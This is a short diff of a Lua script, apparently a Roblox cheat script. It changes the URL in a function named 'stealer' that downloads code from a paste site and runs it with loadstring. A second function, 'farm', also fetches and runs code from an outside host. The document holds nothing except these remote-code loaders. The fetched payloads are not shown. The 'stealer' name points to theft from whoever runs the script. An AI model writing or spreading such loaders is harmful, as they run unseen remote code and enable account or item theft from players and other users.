@@ -1,5 +1,5 @@
 local function stealer()
-   loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/44RqglE2AZD8BgwJ/raw'))()
+   loadstring(game:HttpGet("https://cdn.sourceb.in/bins/GPQUl7KgTt/0", true))()
 end
 local function farm()
     loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6Ijc4MWYxZjU0LTZmZjktNGJkZi04MGM1LTdmOGViOTZiNGFkNiIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6Im1tMm5ld3VpIn19"))()
